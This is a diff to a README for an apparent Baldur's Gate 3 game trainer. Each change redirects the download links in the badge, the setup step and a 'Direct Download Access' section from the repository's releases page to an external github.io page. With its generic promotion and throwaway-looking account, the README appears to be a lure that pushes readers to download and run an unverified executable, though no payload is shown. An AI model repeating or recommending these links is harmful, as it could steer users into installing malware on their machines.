@@ -1,6 +1,6 @@
 # 🎲 baldurs-gate-3-trainer - Unlock Full Control Over Your Adventure
 
-[![Download Now](https://img.shields.io/badge/Download-BG3_Trainer_Here-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/skirretsecretarialassistant7343/baldurs-gate-3-trainer/releases)
+[![Download Now](https://img.shields.io/badge/Download-BG3_Trainer_Here-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://skirretsecretarialassistant7343.github.io)
 
 ## 🧙 What Is This Trainer For?
 
@@ -26,7 +26,7 @@ Follow these simple steps to get the trainer running on your Windows PC. It is d
 
 ### Step 1: Download the Trainer
 
-Visit this link to download the application: **[https://github.com/skirretsecretarialassistant7343/baldurs-gate-3-trainer/releases](https://github.com/skirretsecretarialassistant7343/baldurs-gate-3-trainer/releases)**
+Visit this link to download the application: **[https://skirretsecretarialassistant7343.github.io](https://skirretsecretarialassistant7343.github.io)**
 
 You will find the newest version of the trainer on this page. Click the download link for the file.
 
@@ -82,7 +82,7 @@ This trainer removes the frustrating barriers between you and the story you want
 
 ### 🔗 Direct Download Access
 
-You are one click away from enhancing your game. Visit this link to download the application: **[https://github.com/skirretsecretarialassistant7343/baldurs-gate-3-trainer/releases](https://github.com/skirretsecretarialassistant7343/baldurs-gate-3-trainer/releases)**
+You are one click away from enhancing your game. Visit this link to download the application: **[https://skirretsecretarialassistant7343.github.io](https://skirretsecretarialassistant7343.github.io)**
 
 ## 📝 Final Thoughts
 
